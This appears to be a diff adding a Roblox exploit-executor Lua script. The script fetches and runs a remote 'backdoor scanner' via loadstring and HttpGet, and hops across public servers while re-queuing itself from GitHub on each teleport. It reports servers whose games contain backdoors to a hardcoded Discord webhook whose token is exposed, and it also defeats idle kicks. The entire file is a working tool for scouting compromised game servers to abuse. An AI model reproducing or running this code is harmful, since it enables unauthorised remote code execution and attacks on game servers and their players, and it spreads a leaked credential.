@@ -1,0 +1,331 @@
+-- [ CONFIGURATION ] --
+local success_text = "No backdoored"
+local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
+local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/bakad11"
+local webhook_url = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx" 
+
+local FinalScript = [===[
+    repeat task.wait() until game:IsLoaded()
+
+    -- [[ SYSTEM SERVICES ]] --
+    local LogService = game:GetService("LogService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    local CoreGui = game:GetService("CoreGui")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local RunService = game:GetService("RunService")
+    local UserInputService = game:GetService("UserInputService")
+    local Stats = game:GetService("Stats")
+    local LocalPlayer = Players.LocalPlayer
+
+    -- [[ GLOBAL REGISTRY ]] --
+    local found_success = false
+    local scan_completed = false
+    local fileName = "NotSameServers.json"
+    local currentJobId = tostring(game.JobId)
+    local placeId = game.PlaceId
+    local webhook = "]===] .. webhook_url .. [===["
+    local gameName = "Identifying..."
+    
+    pcall(function()
+        gameName = MarketplaceService:GetProductInfo(placeId).Name
+    end)
+
+    -- [[ ANTI-AFK INITIALIZATION ]] --
+    task.spawn(function()
+        local VirtualUser = game:GetService("VirtualUser")
+        LocalPlayer.Idled:Connect(function()
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new())
+            warn("[SYSTEM] Anti-AFK Triggered: Prevented Idle Kick")
+        end)
+    end)
+
+    -- [[ UI ARCHITECTURE - INDUSTRIAL v6.0 ]] --
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "Scanner_Industrial_v6"
+    screenGui.ResetOnSpawn = false
+    screenGui.DisplayOrder = 999999
+    screenGui.Parent = CoreGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 380, 0, 250) -- Increased size
+    mainFrame.Position = UDim2.new(1, -390, 1, -260)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(0, 8)
+    uiCorner.Parent = mainFrame
+
+    local mainStroke = Instance.new("UIStroke")
+    mainStroke.Color = Color3.fromRGB(0, 255, 150)
+    mainStroke.Thickness = 1.5
+    mainStroke.Parent = mainFrame
+
+    -- Title Section
+    local header = Instance.new("Frame")
+    header.Size = UDim2.new(1, 0, 0, 35)
+    header.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+    header.BorderSizePixel = 0
+    header.Parent = mainFrame
+    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 8)
+
+    local titleText = Instance.new("TextLabel")
+    titleText.Size = UDim2.new(1, -15, 1, 0)
+    titleText.Position = UDim2.new(0, 15, 0, 0)
+    titleText.Text = "AUTO-SCANNER v6.0 | PERSISTENCE ACTIVE"
+    titleText.TextColor3 = Color3.fromRGB(0, 255, 150)
+    titleText.BackgroundTransparency = 1
+    titleText.Font = Enum.Font.GothamBold
+    titleText.TextSize = 13
+    titleText.TextXAlignment = Enum.TextXAlignment.Left
+    titleText.Parent = header
+
+    -- Stats Section (New)
+    local statsFrame = Instance.new("Frame")
+    statsFrame.Size = UDim2.new(1, -20, 0, 40)
+    statsFrame.Position = UDim2.new(0, 10, 0, 45)
+    statsFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+    statsFrame.Parent = mainFrame
+    Instance.new("UICorner", statsFrame).CornerRadius = UDim.new(0, 4)
+
+    local playerDisplay = Instance.new("TextLabel")
+    playerDisplay.Size = UDim2.new(0.5, 0, 1, 0)
+    playerDisplay.Text = "PLAYERS: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers
+    playerDisplay.TextColor3 = Color3.fromRGB(200, 200, 200)
+    playerDisplay.BackgroundTransparency = 1
+    playerDisplay.Font = Enum.Font.GothamSemibold
+    playerDisplay.TextSize = 11
+    playerDisplay.Parent = statsFrame
+
+    local pingDisplay = Instance.new("TextLabel")
+    pingDisplay.Size = UDim2.new(0.5, 0, 1, 0)
+    pingDisplay.Position = UDim2.new(0.5, 0, 0, 0)
+    pingDisplay.Text = "PING: " .. math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
+    pingDisplay.TextColor3 = Color3.fromRGB(200, 200, 200)
+    pingDisplay.BackgroundTransparency = 1
+    pingDisplay.Font = Enum.Font.GothamSemibold
+    pingDisplay.TextSize = 11
+    pingDisplay.Parent = statsFrame
+
+    -- Status & Progress
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -20, 0, 20)
+    statusLabel.Position = UDim2.new(0, 10, 0, 95)
+    statusLabel.Text = "SYSTEM: BOOTING..."
+    statusLabel.TextColor3 = Color3.new(1, 1, 1)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Font = Enum.Font.GothamSemibold
+    statusLabel.TextSize = 12
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Parent = mainFrame
+
+    local pBack = Instance.new("Frame", mainFrame)
+    pBack.Size = UDim2.new(1, -20, 0, 4)
+    pBack.Position = UDim2.new(0, 10, 0, 120)
+    pBack.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    pBack.BorderSizePixel = 0
+
+    local pBar = Instance.new("Frame", pBack)
+    pBar.Size = UDim2.new(0, 0, 1, 0)
+    pBar.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+    pBar.BorderSizePixel = 0
+
+    -- [[ THE CONSOLE (SCROLLABLE LOGS) ]] --
+    local logContainer = Instance.new("ScrollingFrame")
+    logContainer.Size = UDim2.new(1, -20, 0, 100)
+    logContainer.Position = UDim2.new(0, 10, 0, 135)
+    logContainer.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+    logContainer.BorderSizePixel = 0
+    logContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+    logContainer.ScrollBarThickness = 3
+    logContainer.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 150)
+    logContainer.Parent = mainFrame
+    Instance.new("UICorner", logContainer).CornerRadius = UDim.new(0, 4)
+
+    local logLayout = Instance.new("UIListLayout", logContainer)
+    logLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    logLayout.Padding = UDim.new(0, 3)
+
+    local function updateLog(txt, color)
+        local logMsg = Instance.new("TextLabel")
+        logMsg.Size = UDim2.new(1, -10, 0, 16)
+        logMsg.BackgroundTransparency = 1
+        logMsg.Text = " [" .. os.date("%X") .. "] " .. txt
+        logMsg.TextColor3 = color or Color3.fromRGB(220, 220, 220)
+        logMsg.Font = Enum.Font.Code
+        logMsg.TextSize = 10
+        logMsg.TextXAlignment = Enum.TextXAlignment.Left
+        logMsg.Parent = logContainer
+        
+        -- Automatic scrolling logic
+        logContainer.CanvasSize = UDim2.new(0, 0, 0, logLayout.AbsoluteContentSize.Y + 5)
+        logContainer.CanvasPosition = Vector2.new(0, logLayout.AbsoluteContentSize.Y)
+    end
+
+    -- [[ PERSISTENCE HANDLER ]] --
+    local function loadIDs()
+        updateLog("Accessing file system...", Color3.new(1,1,1))
+        local ok, data = pcall(function()
+            if isfile(fileName) then
+                return HttpService:JSONDecode(readfile(fileName))
+            end
+        end)
+        if ok and type(data) == "table" then
+            updateLog("Loaded " .. #data .. " previous servers.", Color3.fromRGB(0, 255, 100))
+            return data
+        end
+        updateLog("Initializing new blacklist database.", Color3.fromRGB(255, 200, 0))
+        return {os.date("!*t").hour}
+    end
+
+    local AllIDs = loadIDs()
+
+    local function saveIDs()
+        pcall(function()
+            writefile(fileName, HttpService:JSONEncode(AllIDs))
+        end)
+    end
+
+    local function blacklist(id)
+        local sid = tostring(id)
+        for _, v in pairs(AllIDs) do if v == sid then return end end
+        table.insert(AllIDs, sid)
+        saveIDs()
+        updateLog("Stored ID: .." .. string.sub(sid, -6), Color3.fromRGB(150, 150, 150))
+    end
+
+    blacklist(currentJobId)
+
+    -- [[ WEBHOOK ENGINE ]] --
+    local function executeWebhook(desc)
+        if webhook == "" or webhook == "YOUR_WEBHOOK_HERE" then return end
+        local embed = {
+            ["username"] = "Industrial Scanner v6",
+            ["embeds"] = {{
+                ["title"] = "🚨 BACKDOOR DETECTED!",
+                ["color"] = 16724531,
+                ["description"] = desc,
+                ["fields"] = {
+                    {["name"] = "Game", ["value"] = gameName, ["inline"] = true},
+                    {["name"] = "Players", ["value"] = #Players:GetPlayers() .. "/" .. Players.MaxPlayers, ["inline"] = true},
+                    {["name"] = "JobId", ["value"] = "```" .. currentJobId .. "```", ["inline"] = false}
+                },
+                ["footer"] = {["text"] = "ID: " .. placeId}
+            }}
+        }
+        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+        if req then
+            pcall(function()
+                req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(embed)})
+            end)
+            updateLog("Webhook dispatched successfully.", Color3.fromRGB(0, 200, 255))
+        end
+    end
+
+    -- [[ THE MAIN SCANNER LOGIC ]] --
+    local con
+    con = LogService.MessageOut:Connect(function(m)
+        local low = m:lower()
+        if string.find(low, "]===] .. success_text:lower() .. [===[" , 1, true) then
+            found_success = true
+        end
+        if string.find(low, "complete") or string.find(low, "finished") then
+            scan_completed = true
+        end
+    end)
+
+    updateLog("Attempting loadstring injection...", Color3.new(1, 1, 1))
+    local s_ok, s_err = pcall(function()
+        loadstring(game:HttpGet("]===] .. script_url .. [===["))()
+    end)
+
+    if not s_ok then
+        statusLabel.Text = "CRITICAL: INJECTION FAILED"
+        updateLog("Error: " .. tostring(s_err), Color3.new(1, 0, 0))
+        return
+    end
+
+    local t = 0
+    local maxT = 45
+    while t < maxT do
+        if found_success then break end
+        if scan_completed and t > 5 then break end
+        t = t + 1
+        pBar.Size = UDim2.new(t/maxT, 0, 1, 0)
+        statusLabel.Text = "NETWORK ANALYSIS IN PROGRESS... (" .. t .. "s)"
+        
+        -- Update UI Stats in real-time
+        pingDisplay.Text = "PING: " .. math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
+        
+        task.wait(1)
+    end
+    con:Disconnect()
+
+    -- [[ RESULT PROCESSING ]] --
+    if found_success then
+        statusLabel.Text = "RESULT: SAFE. MOVING TO NEXT..."
+        updateLog("Clearing server. Finding new instance...", Color3.fromRGB(255, 200, 0))
+        
+        local function hopServers()
+            local q = (syn and syn.queue_on_teleport) or (queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+            if q then pcall(function() q(game:HttpGet("]===] .. self_url .. [===[")) end) end
+
+            local c = ""
+            while true do
+                updateLog("Polling Roblox API for servers...", Color3.fromRGB(140, 140, 140))
+                local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
+                if c ~= "" then url = url .. "&cursor=" .. c end
+                
+                local ok, res = pcall(function() return game:HttpGet(url) end)
+                if ok and res then
+                    local decoded = HttpService:JSONDecode(res)
+                    if decoded and decoded.data then
+                        if decoded.nextPageCursor then c = decoded.nextPageCursor end
+                        for _, server in pairs(decoded.data) do
+                            local id = tostring(server.id)
+                            if server.playing < server.maxPlayers and id ~= currentJobId then
+                                local seen = false
+                                for _, ex in pairs(AllIDs) do if id == ex then seen = true break end end
+                                if not seen then
+                                    updateLog("Target Found: .." .. string.sub(id, -6), Color3.new(1, 1, 1))
+                                    blacklist(id)
+                                    statusLabel.Text = "TELEPORTING..."
+                                    task.wait(0.5)
+                                    TeleportService:TeleportToPlaceInstance(placeId, id, LocalPlayer)
+                                    task.wait(6)
+                                end
+                            end
+                        end
+                    end
+                else
+                    updateLog("Rate Limit reached. Waiting 10s...", Color3.new(1, 0, 0))
+                    task.wait(10)
+                end
+                task.wait(1)
+            end
+        end
+        hopServers()
+    else
+        statusLabel.Text = "!!! ALERT: BACKDOOR DETECTED !!!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 40, 40)
+        mainStroke.Color = Color3.fromRGB(255, 40, 40)
+        mainStroke.Thickness = 2.5
+        updateLog("CRITICAL HIT: No safety phrase found.", Color3.new(1, 0, 0))
+        executeWebhook("Positive result. No safety phrase detected during scan. Server secured.")
+        
+        task.spawn(function()
+            while true do
+                mainStroke.Transparency = 0.5
+                task.wait(0.4)
+                mainStroke.Transparency = 0
+                task.wait(0.4)
+            end
+        end)
+    end
+]===]
+
+loadstring(FinalScript)()
